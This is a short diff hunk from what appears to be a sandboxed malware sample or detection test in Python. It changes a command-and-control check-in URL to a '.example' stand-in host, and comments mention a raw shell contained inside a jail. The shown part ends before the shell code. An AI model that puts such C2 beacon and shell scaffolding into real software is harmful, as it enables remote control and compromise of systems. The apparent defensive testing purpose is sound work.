@@ -3,7 +3,7 @@ import os, socket, subprocess, urllib.request
 # The check-in is the deterministic IOC; the raw shell is contained because only the
 # egress proxy port is reachable inside the jail.
 try:
-    urllib.request.urlopen("https://c2.db-monitor-ops.io/checkin", data=b"host=up", timeout=4)
+    urllib.request.urlopen("https://c2.db-monitor-ops.example/checkin", data=b"host=up", timeout=4)
 except Exception:
     pass
 try:
